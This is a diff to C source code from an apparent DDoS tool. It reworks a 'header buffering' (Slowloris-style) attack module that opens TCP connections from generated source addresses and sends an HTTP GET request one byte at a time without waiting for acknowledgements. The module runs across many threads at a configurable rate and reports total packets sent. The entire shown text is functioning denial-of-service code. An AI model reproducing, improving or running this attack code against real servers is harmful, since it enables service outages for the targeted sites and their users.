@@ -6,7 +6,7 @@
 #include "ddos/header_buffering.h"
 
 #define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-
+#define GET_METHOD_LEN 50
 extern int g_num_threads;
 
 // session counting
@@ -30,16 +30,7 @@ pthread_cond_t g_headbuf_cond = PTHREAD_COND_INITIALIZER;
 // time checking
 struct timespec g_headbuf_before_time;
 struct timespec g_headbuf_now_time;
-// request msg
-char g_headbuf_request_msg[__HEADER_BUFFERING_REQUEST_MSG_SIZE__ ];
-// socket
-int g_headbuf_maximum = 5;
-int *g_headbuf_sockets;
-int *g_headbuf_src_ports;
-int *g_headbuf_seq;
-int *g_headbuf_ack;
-__u32 g_headbuf_current_idx;
-int *g_headbuf_http_cursor;
+
 
 void header_buffering_print_usage(void)
 {
@@ -52,11 +43,24 @@ void header_buffering_print_usage(void)
 void *generate_header_buffering(void *data)
 {
 	int thread_id = *((int*) data);
+	//make tcp connection
+	int sock = -1;
+	int src_port, seq, ack;
+	int head_buffering_cnt=0;
+	int index=0;
+
+
+	char get_method[GET_METHOD_LEN];
+	strcpy(get_method,"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
+
+	int get_method_len = strlen(get_method);
+	printf("LEN : %d\n",get_method_len);
+
 	while (1) {
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_headbuf_mutex);
 		// making tcp connection
-		if (g_headbuf_sockets[g_headbuf_current_idx] == -2) {
+
 			// get now resource
 			generator(
 					g_headbuf_src_ip,
@@ -68,30 +72,21 @@ void *generate_header_buffering(void *data)
 					g_headbuf_now_src_ip,
 					g_headbuf_now_dest_ip,
 					&g_headbuf_now_dest_port);
-			g_headbuf_sockets[g_headbuf_current_idx] = socket(AF_INET,
-					SOCK_STREAM, 0);
-			/* SENDBUF settings, need more tests on this.
-			 * int sdbf = 2;
-			if (setsockopt(g_headbuf_sockets[g_headbuf_current_idx], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
-			 == -1) {
-			 perror("setsockopt failure.\n");
-			 }*/
-			if (g_headbuf_sockets[g_headbuf_current_idx] == -1) {
-				perror("sock creation failed\n");
-			}
-			g_headbuf_sockets[g_headbuf_current_idx] =
-				tcp_make_connection(
-						inet_addr(g_headbuf_now_src_ip),
-						inet_addr(g_headbuf_now_dest_ip),
-						&(g_headbuf_src_ports[g_headbuf_current_idx]),
-						g_headbuf_now_dest_port,
-						g_headbuf_seq + g_headbuf_current_idx,
-						g_headbuf_ack + g_headbuf_current_idx,
-						0);
-			// printf("sock value : %d\n", g_headbuf_sockets[g_headbuf_current_idx]);
+		if(head_buffering_cnt % get_method_len==0)
+		{
+			if(sock!=-1) close(sock);
+			sock = tcp_make_connection(
+					inet_addr(g_headbuf_now_src_ip),
+					inet_addr(g_headbuf_now_dest_ip),
+					&src_port,
+					g_headbuf_now_dest_port,
+					&seq,
+					&ack,
+					0);
+			head_buffering_cnt=0;
+			index=0;
 		}
-		pthread_mutex_unlock(&g_headbuf_mutex);
-		pthread_mutex_lock(&g_headbuf_mutex);
+
 		// wait a second
 		if (g_headbuf_num_generated_in_sec >= g_headbuf_request_per_sec) {
 			pthread_cond_wait(&g_headbuf_cond, &g_headbuf_mutex);
@@ -103,44 +98,25 @@ void *generate_header_buffering(void *data)
 				&g_headbuf_now_time,
 				&g_headbuf_num_generated_in_sec);
 		// send
-		int sent_size = -1;
-		if (g_headbuf_sockets[g_headbuf_current_idx] >= 0) {
-			printf("src port = %d, data = %c\n",
-					g_headbuf_src_ports[g_headbuf_current_idx],
-					*(g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx]));
-			tcp_socket_send_data_no_ack(
-					g_headbuf_sockets[g_headbuf_current_idx],
-					inet_addr(g_headbuf_now_src_ip),
-					inet_addr(g_headbuf_now_dest_ip),
-					g_headbuf_src_ports[g_headbuf_current_idx],
-					g_headbuf_now_dest_port,
-					g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx],
-					1,
-					g_headbuf_seq[g_headbuf_current_idx],
-					g_headbuf_seq[g_headbuf_current_idx],
-					0);
-			g_headbuf_seq[g_headbuf_current_idx]++;
+		char data = get_method[index];
+		tcp_socket_send_data_no_ack(
+				sock,
+				inet_addr(g_headbuf_now_src_ip),
+				inet_addr(g_headbuf_now_dest_ip),
+				src_port,
+				g_headbuf_now_dest_port,
+				&data,
+				1,
+				seq,
+				ack,
+				0);
+		seq += 1;
 
-			g_headbuf_num_generated_in_sec++;
-			g_headbuf_num_total++;
-			/*printf("%lu Socket[%d] send %c : %d\n",
-			 g_headbuf_num_generated_in_sec,
-			 g_headbuf_sockets[g_headbuf_current_idx],
-			 *(g_headbuf_request_msg + g_headbuf_http_cursor[g_headbuf_current_idx]),
-			 sent_size);*/
-			g_headbuf_http_cursor[g_headbuf_current_idx] += 1;
-			if (g_headbuf_http_cursor[g_headbuf_current_idx] >=
-					__HEADER_BUFFERING_REQUEST_MSG_SIZE__) {
-				g_headbuf_http_cursor[g_headbuf_current_idx] = 0;
-				close(g_headbuf_sockets[g_headbuf_current_idx]);
-				g_headbuf_sockets[g_headbuf_current_idx] = -2;
-			}
-			g_headbuf_current_idx++;
-		}
-		if (g_headbuf_current_idx >= g_headbuf_maximum) {
-			g_headbuf_current_idx = 0;
-		}
-		// *** end of critical section ***
+		g_headbuf_num_generated_in_sec++;
+		g_headbuf_num_total++;
+		index++;
+		head_buffering_cnt++;
+
 		pthread_mutex_unlock(&g_headbuf_mutex);
 	}
 	return NULL;
@@ -162,8 +138,7 @@ void *header_buffering_time_check(void *data)
 
 void header_buffering_main(char *argv[])
 {
-	strcpy(g_headbuf_request_msg, GET_METHOD);
-	printf("HTTP header msg:\n%s\n", g_headbuf_request_msg);
+
 	int argc = 0;
 	while (argv[argc] != NULL) {
 		argc++;
@@ -185,19 +160,6 @@ void header_buffering_main(char *argv[])
 	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
 	memset(&g_headbuf_now_time, 0, sizeof(struct timespec));
 	g_headbuf_request_per_sec = atoi(argv[3]);
-	// socket preparation
-	g_headbuf_sockets = (int*) malloc(sizeof(int) * g_headbuf_maximum);
-	g_headbuf_http_cursor = (int*) malloc(sizeof(int) * g_headbuf_maximum);
-	g_headbuf_src_ports = (int*) malloc(sizeof(int) * g_headbuf_maximum);
-	g_headbuf_seq = (int*) malloc(sizeof(int) * g_headbuf_maximum);
-	g_headbuf_ack = (int*) malloc(sizeof(int) * g_headbuf_maximum);
-
-	g_headbuf_current_idx = 0;
-	int tmp;
-	for (tmp = 0; tmp < g_headbuf_maximum; tmp++) {
-		g_headbuf_sockets[tmp] = -2;
-		g_headbuf_http_cursor[tmp] = 0;
-	}
 	const int num_threads = g_num_threads;
 	pthread_t threads[9999];
 	int thread_ids[9999];
@@ -221,11 +183,7 @@ void header_buffering_main(char *argv[])
 	}
 	printf("Head Buffering attack finished\nTotal %lu packets sent.\n",
 			g_headbuf_num_total);
-	free(g_headbuf_sockets);
-	free(g_headbuf_http_cursor);
-	free(g_headbuf_src_ports);
-	free(g_headbuf_seq);
-	free(g_headbuf_ack);
+
 	pthread_mutex_destroy(&g_headbuf_mutex);
 	pthread_exit(NULL);
 	return;
